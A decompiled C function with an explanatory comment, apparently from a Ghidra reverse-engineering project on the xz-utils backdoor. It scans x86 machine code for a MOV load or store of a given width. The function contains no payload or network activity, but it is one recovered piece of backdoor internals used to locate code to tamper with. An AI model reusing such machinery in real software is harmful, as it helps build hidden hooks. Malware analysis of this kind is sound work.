// /home/kali/xzre-ghidra/xzregh/100E00_find_mov_instruction.c
// Function: find_mov_instruction @ 0x100E00
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: MOV-only variant of the pointer scan: decodes sequentially, requires the memory↔register ModRM form, enforces the REX.W width test when `is_64bit_operand` is TRUE (waived for stores), and accepts only opcode `0x10b` (load) or `0x109` (store) per `load_flag`.
 * Decode failures advance one byte; otherwise the loop walks by `instruction_size`, returning TRUE with `dctx` on the matching MOV.
 */

#include "xzre_types.h"

BOOL find_mov_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  BOOL decode_ok;
  long clear_idx;
  dasm_ctx_t *zero_ctx;
  BOOL opcode_match;
  dasm_ctx_t scratch_ctx;
  
  zero_ctx = &scratch_ctx;
  for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(undefined4 *)&zero_ctx->instruction = 0;
    zero_ctx = (dasm_ctx_t *)((long)&zero_ctx->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &scratch_ctx;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      decode_ok = x86_dasm(dctx,code_start,code_end);
      if (decode_ok != FALSE) break;
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      if (load_flag == FALSE) {
        opcode_match = *(int *)(dctx->opcode_window + 3) == 0x109;
      }
      else {
        opcode_match = *(int *)(dctx->opcode_window + 3) == 0x10b;
      }
      if (opcode_match) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

